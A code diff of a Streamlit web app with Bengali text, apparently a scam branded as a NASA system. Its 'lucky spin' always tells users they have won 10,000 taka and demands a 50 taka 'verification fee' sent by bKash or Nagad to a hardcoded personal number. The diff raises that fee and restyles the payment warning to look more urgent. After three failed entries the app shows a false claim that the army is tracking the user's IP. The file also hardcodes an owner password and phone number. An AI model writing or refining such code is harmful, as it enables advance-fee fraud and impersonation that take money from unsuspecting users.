@@ -44,22 +44,22 @@ st.markdown("""
         font-size: 18px;
     }
     .payment-notice { 
-        background: rgba(255, 255, 0, 0.1); 
-        border: 1px solid yellow; 
-        color: yellow; 
+        background: rgba(255, 0, 0, 0.2); 
+        border: 2px solid red; 
+        color: white; 
         padding: 20px; 
         border-radius: 10px; 
         text-align: center; 
         font-weight: bold;
+        box-shadow: 0 0 15px red;
     }
     </style>
     """, unsafe_allow_html=True)
 
 # --- ২. মাস্টার কন্ট্রোল ও ডাটা সেটিংস ---
-OWNER_PASS = "Akash@Owner#2026"  # তোমার অ্যাডমিন পাসওয়ার্ড
-AKASH_NUMBER = "01967840830"    # তোমার বিকাশ/নগদ নাম্বার
+OWNER_PASS = "Akash@Owner#2026"  
+AKASH_NUMBER = "01967840830"    
 
-# এখানে তুমি সেই TrxID গুলো সেভ করবে যেগুলো কাস্টমার টাকা পাঠানোর পর পাবে
 VALID_TRX_IDS = ["8M29X7PQ", "9L54KT2R", "AKASH786", "NASA2026", "SUCCESS100"] 
 
 if 'access' not in st.session_state: st.session_state.access = False
@@ -70,7 +70,7 @@ if 'failed_attempts' not in st.session_state: st.session_state.failed_attempts =
 st.markdown('<img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/NASA_logo.svg" class="nasa-logo">', unsafe_allow_html=True)
 st.markdown("<div class='header-text'><h1>🚀 NASA OFFICIAL SUPREME CORE V33</h1><p>MASTER SYSTEM SECURED BY AKASH</p></div>", unsafe_allow_html=True)
 
-# --- ৪. ট্রানজেকশন আইডি লক স্ক্রিন (সবকিছুর গেটওয়ে) ---
+# --- ৪. ট্রানজেকশন আইডি লক স্ক্রিন ---
 if not st.session_state.access:
     st.markdown("<div class='lock-screen'>", unsafe_allow_html=True)
     st.subheader("🔑 সিস্টেমটি আনলক করতে পেমেন্ট ভেরিফাই করুন")
@@ -89,7 +89,6 @@ if not st.session_state.access:
         if st.button("সিস্টেম আনলক করুন 🔓"):
             if user_trx in VALID_TRX_IDS:
                 st.session_state.access = True
-                # লগ হিসেবে সেভ করা যাতে তুমি পরে দেখতে পারো
                 st.session_state.payment_logs.append({
                     "সময়": datetime.now().strftime("%I:%M:%S %p"),
                     "TrxID": user_trx,
@@ -100,19 +99,18 @@ if not st.session_state.access:
                 st.rerun()
             else:
                 st.session_state.failed_attempts += 1
-                st.error("❌ ভুল Transaction ID! সঠিক কোড না দিলে ঢুকতে পারবেন না।")
+                st.error("❌ ভুল Transaction ID!")
     
     with col2:
         if st.button("সহায়তা/লাইসেন্স 📞"):
             st.info(f"কল করুন: {AKASH_NUMBER}")
 
-    # ৩ বার ভুল করলে সেই আর্মি সিকিউরিটি অ্যালার্ট
     if st.session_state.failed_attempts >= 3:
         st.markdown("<h2 style='color:red; text-align:center;'>🚨 হ্যাকিং ডিটেক্টেড! সেনাবাহিনী আপনার আইপি ট্র্যাক করছে।</h2>", unsafe_allow_html=True)
         st.image("https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJqNmU5b3h6eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnBvPXYmY3Q9Zw/V4NSRTs3h9XfG/giphy.gif")
     
     st.markdown("</div>", unsafe_allow_html=True)
-    st.stop() # পেমেন্ট না দেওয়া পর্যন্ত নিচের কিছু কাজ করবে না
+    st.stop()
 
 # --- ৫. মূল ড্যাশবোর্ড (পেমেন্ট ভেরিফাই হওয়ার পর) ---
 tab1, tab2, tab3 = st.tabs(["🎁 LUCKY SPIN", "📊 USER DATABASE", "🔐 ADMIN CONTROL"])
@@ -125,7 +123,16 @@ with tab1:
             time.sleep(1.5)
             st.balloons()
             st.success("🎉 অভিনন্দন! আপনি ১০,০০০ টাকা পুরস্কার জিতেছেন!")
-            st.markdown(f"<div class='payment-notice'>পুরস্কারের টাকা ক্লেইম করতে ২০ টাকা সার্ভার ফি পাঠান: {AKASH_NUMBER}<br>টাকা না পাঠালে পুরস্কার বাতিল হবে।</div>", unsafe_allow_html=True)
+            
+            # ৫০ টাকা চার্জের মেসেজ এবং নগদ/বিকাশ ক্লিয়ার করা হয়েছে
+            st.markdown(f"""
+                <div class='payment-notice'>
+                <h3>⚠️ পেমেন্ট পেন্ডিং!</h3>
+                <p>পুরস্কারের ১০,০০০ টাকা আপনার একাউন্টে নিতে <b>৫০ টাকা</b> সার্ভার ভেরিফিকেশন ফি প্রদান করুন।</p>
+                <p>বিকাশ অথবা নগদ পার্সোনাল নাম্বার: <b>{AKASH_NUMBER}</b></p>
+                <p style='color: #FFD700;'>টাকা পাঠানোর ৫ মিনিটের মধ্যে আপনার পুরস্কারের টাকা পৌঁছে যাবে।</p>
+                </div>
+            """, unsafe_allow_html=True)
 
 with tab2:
     st.markdown("### 🏦 NASA ইউজার ডাটা পোর্টাল")
@@ -140,19 +147,14 @@ with tab3:
     admin_input = st.text_input("মাস্টার পাসওয়ার্ড দিন (Owner Only):", type="password")
     
     if admin_input == OWNER_PASS:
-        st.write("### ✅ পেমেন্ট করা কাস্টমারদের তালিকা (অডিট লগ):")
+        st.write("### ✅ পেমেন্ট করা কাস্টমারদের তালিকা:")
         if st.session_state.payment_logs:
-            # এই টেবিলটিই তোমার সেই জায়গা যেখানে তুমি সব পেমেন্ট দেখতে পারবে
             df = pd.DataFrame(st.session_state.payment_logs)
             st.table(df)
-            
-            # ডাটা ডাউনলোড করার অপশন (পেনড্রাইভের জন্য)
-            csv = df.to_csv(index=False).encode('utf-8')
-            st.download_button("📥 ডাউনলোড রিপোর্ট (CSV)", data=csv, file_name=f"Payments_{datetime.now().date()}.csv")
         else:
             st.info("এখনো কোনো কাস্টমার পেমেন্ট করে ঢোকেনি।")
     elif admin_input != "":
-        st.error("🚨 পাসওয়ার্ড ভুল! এই এলাকাটি শুধু আকাশ জান-এর জন্য।")
+        st.error("🚨 পাসওয়ার্ড ভুল!")
 
 st.markdown("---")
 st.caption(f"© 2026 AKASH NASA AI SUPREME SYSTEM | LAST UPDATE: {datetime.now().date()}")
